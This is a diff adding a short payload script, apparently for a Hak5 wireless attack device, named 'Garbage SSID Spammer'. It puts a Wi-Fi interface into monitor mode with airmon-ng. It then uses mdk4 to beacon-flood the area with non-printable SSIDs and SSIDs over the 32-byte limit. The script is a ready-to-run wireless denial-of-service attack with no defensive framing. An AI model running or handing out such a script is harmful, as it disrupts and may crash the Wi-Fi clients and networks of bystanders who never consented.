@@ -1,0 +1,10 @@
+# Title: Garbage SSID Spammer
+# Description: Uses mdk4 to beacon non-printable SSIDs and SSIDs that break the 32-byte limit
+# Author: Hak5Darren
+# Props: ASPj and the aircrack-ng community
+# Version: 1.0
+
+LED SETUP
+airmon-ng start wlan0
+LED ATTACK
+mdk4 wlan0mon b -a -m -s 500
